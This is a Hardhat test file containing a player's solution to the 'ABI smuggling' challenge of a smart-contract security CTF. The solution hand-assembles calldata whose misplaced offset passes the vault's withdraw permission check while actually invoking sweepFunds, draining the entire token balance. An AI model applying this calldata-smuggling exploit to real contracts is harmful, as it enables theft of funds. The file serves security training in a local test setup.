const { ethers } = require("hardhat");
const { expect } = require("chai");
const { keccak256, hexZeroPad, hexConcat } = require("ethers/lib/utils");

describe("[Challenge] ABI smuggling", function () {
    let deployer, player, recovery;
    let token, vault;

    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player, recovery] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (
            await ethers.getContractFactory("DamnValuableToken", deployer)
        ).deploy();

        // Deploy Vault
        vault = await (
            await ethers.getContractFactory("SelfAuthorizedVault", deployer)
        ).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId(
            "0x85fb709d",
            deployer.address,
            vault.address
        );

        // player = withdraw
        const playerPermission = await vault.getActionId(
            "0xd9caed12",
            player.address,
            vault.address
        );
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
        await expect(
            vault
                .connect(player)
                .withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
    });

    it("Execution", async function () {
        /** CODE YOUR SOLUTION HERE */

        // 1 byte = 8 bits (binary) = 256
        // 1 byte = FF (hex) = 256

        // execute
        // 0 x selector address offset size actiondata

        // 0 x selector / vault.address / 0x000000000000000000000000064 / 0x00000000000000000000 / withdraw selector /

        // 0 x address (32 bytes) ()
        //exec selector
        let executeFunctionSelector = "0x1cff79cd";

        //first param
        let address = hexZeroPad(vault.address.toString(), 32);

        // offset
        let actionDataOffset = hexZeroPad("0x64", 32);

        // cheating the system
        let actionDataArb = hexZeroPad("0x0", 32);
        let withdrawSelector = hexZeroPad("0xd9caed12");

        let sweepDataSize = hexZeroPad("0x44", 32);

        let sweepData = vault.interface.encodeFunctionData("sweepFunds", [
            recovery.address,
            token.address,
        ]);

        //let actionData = hexZeroPad("", 32);

        let data = hexConcat([
            executeFunctionSelector,
            address,
            actionDataOffset,
            actionDataArb,
            withdrawSelector,
            sweepDataSize,
            sweepData,
        ]);

        console.log(data);

        await player.sendTransaction({ to: vault.address, data });
        // console.log(aactionDataOffsetddress);
    });

    after(async function () {
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(
            VAULT_TOKEN_BALANCE
        );
    });
});
